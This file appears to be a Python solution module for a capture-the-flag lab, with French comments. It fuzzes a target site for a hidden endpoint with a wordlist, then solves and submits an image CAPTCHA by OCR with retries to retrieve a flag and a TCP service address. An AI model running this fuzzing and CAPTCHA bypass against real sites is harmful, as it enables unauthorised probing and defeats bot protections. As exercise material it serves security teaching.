"""Phase web : fuzzing de l'endpoint caché puis franchissement du CAPTCHA.

Une :class:`Session` garde un cookie HTTP cohérent entre la page interne
(qui génère le code) et l'image du CAPTCHA (qui en dépend), résout le code et
soumet le formulaire. La réponse livre le flag 1, l'adresse du service TCP et
la clé d'encodage.
"""

from __future__ import annotations

from pathlib import Path
from urllib.parse import urljoin

import requests

from tp3.utils.captcha import Captcha
from tp3.utils.config import logger

# Wordlist embarquée (chemin relatif au code : l'outil tourne depuis un
# répertoire de travail vide sur l'instance hébergée).
WORDLIST = Path(__file__).parent / "wordlist.txt"
# Marqueur attendu sur la page interne : confirme l'endpoint découvert.
_PANEL_MARKER = "captcha"
_MAX_CAPTCHA_TRIES = 12


def load_wordlist() -> list[str]:
    """Charge la wordlist embarquée (une entrée par ligne)."""
    words = [w.strip() for w in WORDLIST.read_text(encoding="utf-8").splitlines()]
    return [w for w in words if w and not w.startswith("#")]


def find_hidden_endpoint(target: str, http: requests.Session) -> str:
    """Fuzze les chemins de la wordlist et retourne l'endpoint caché.

    L'endpoint est reconnu par une réponse 200 contenant le formulaire CAPTCHA.
    """
    for word in load_wordlist():
        path = word.lstrip("/")
        try:
            resp = http.get(urljoin(target + "/", path), allow_redirects=False, timeout=5)
        except requests.RequestException:
            continue
        if resp.status_code == 200 and _PANEL_MARKER in resp.text.lower():
            logger.info(f"Endpoint caché trouvé : /{path}")
            return path
    raise RuntimeError("endpoint caché introuvable avec la wordlist fournie")


class Session:
    """Session résolvant le CAPTCHA et récupérant flag 1 + infos TCP."""

    def __init__(self, url: str, endpoint: str | None = None):
        """Initialise la session.

        Args:
            url: URL de base de la cible (ex. http://127.0.0.1:8080).
            endpoint: chemin de la page interne. Si ``None``, il est découvert
                par fuzzing lors de :meth:`prepare_request`.
        """
        self.url = url.rstrip("/")
        self.endpoint = endpoint
        self.http = requests.Session()
        self.captcha_value = ""
        self.flag_value = ""
        self.valid_flag = ""
        self.response: dict = {}

    def _panel_url(self) -> str:
        return f"{self.url}/{self.endpoint}"

    def prepare_request(self) -> None:
        """Découvre l'endpoint si besoin, pose le cookie et résout le CAPTCHA."""
        if not self.endpoint:
            self.endpoint = find_hidden_endpoint(self.url, self.http)
        # GET de la page interne : pose le cookie de session et génère un code.
        self.http.get(self._panel_url(), timeout=5)
        captcha = Captcha(f"{self.url}/captcha.png", self.http)
        captcha.capture()
        captcha.solve()
        self.captcha_value = captcha.get_value()

    def submit_request(self) -> requests.Response:
        """Soumet le CAPTCHA résolu au formulaire de la page interne."""
        return self.http.post(
            self._panel_url(), data={"captcha": self.captcha_value}, timeout=5
        )

    def process_response(self) -> dict | None:
        """Enchaîne prepare/submit avec réessais OCR et parse la réponse.

        Returns:
            Le dict ``{flag1, host, port, key}`` en cas de succès, sinon ``None``.
        """
        for attempt in range(1, _MAX_CAPTCHA_TRIES + 1):
            self.prepare_request()
            resp = self.submit_request()
            if resp.status_code == 200:
                self.response = resp.json()
                self.flag_value = self.response.get("flag1", "")
                self.valid_flag = self.flag_value
                logger.info(f"CAPTCHA franchi en {attempt} essai(s)")
                return self.response
            logger.info(f"Essai {attempt} : code '{self.captcha_value}' refusé")
        logger.error("CAPTCHA non résolu après %d essais", _MAX_CAPTCHA_TRIES)
        return None

    def get_flag(self) -> str:
        """Retourne le flag 1 validé."""
        return self.valid_flag
